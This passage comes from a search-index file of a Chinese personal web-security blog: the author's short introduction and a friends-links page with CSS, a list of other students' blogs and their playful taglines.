x.html"},{"title":"about","text":"也是花了不少时间搭建了这个博客，但是先前做过的许多有意义的题目由于博客未搭建起来并没有很好地记录下解题心得，见过许多大佬们有参考价值的博客也只能放在收藏夹吃灰，如今博客搭建起来了便好好利用起来罢，今后还会有许许多多的未知等待着我去探索。 初来乍到，如果博客中有出现任何错误都希望大佬们能够指出。也希望自己能不断进步 Hello! Web Security!!!","link":"/about/index.html"},{"title":"link","text":".friends { display: flex; align-items: stretch; justify-content: space-between; flex-wrap: wrap; margin: -6px; } .friends .friend { margin: 6px; min-width: 240px; flex: 1; display: flex; align-items: center; justify-content: center; border-radius: 10px; border: 1px solid rgba(200, 200, 200, 0.2); background-color: rgba(200, 200, 200, 0.1); position: relative; } .friends .friend.friend-empty { border: none; background: none; } .friends .friend .friend-avatar { flex-shrink: 0; margin: 8px; width: 60px; height: 60px; line-height: 60px; border-radius: 30px; background-color: rgba(200, 200, 200, 0.2); background-size: cover; background-position: center; font-size: 24px; text-align: center; } .friends .friend .friend-detail { flex: 1; width: 0; display: flex; flex-direction: column; margin: 8px 8px 8px 0; } .friends .friend .friend-pop { position: absolute; width: 100%; left: 0; bottom: 0; } .friends .friend .friend-pop div { position: absolute; width: 100%; top: 8px; left: 0; padding: 8px; color: rgba(255, 255, 255, 0.9); border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 10; user-select: none; pointer-events: none; transition: opacity 0.5s; opacity: 0; } .friends .friend:hover .friend-pop div { opacity: 1; } LinTu's Blog&nbsp; linturrr.github.io Th15_15_th3_5m@rt35t_j3llyf15h_1n_th3_w0rld. Diffany's Blog&nbsp; gudiffany.github.io 一个努力学习的菜鸟 ixout's Blog&nbsp; ixout.github.io 咸鱼 MyTTe's Blog&nbsp; mytte-233.github.io fxxk lincode cccsl_'s Blog&nbsp; blog.csdn.net/fzucaicai fzucaicai dududu's Blog&nbsp; dududu11zz.github.io dududu Satolu's Blog&nbsp; xzb666-hub.github.io 明悟在我 Cola's Blog&nbsp; blog.hijwei.top Fl4g{Th1s_15_C0l4'5_Bl0g} 彭强学弟's Blog&nbsp; wsygdsgg.github.io 遇事不决，可问春风。春风不语，即随本心 Gaster's Blog&nbsp; gaster44.github.io 肚子好饿，早知道不学信息安全了 Cina's Blog&nbsp; cina666.github.io 给你两个窝窝 example's Blog&nbsp; example.com 咸鱼","link":"/link/index.html"}]}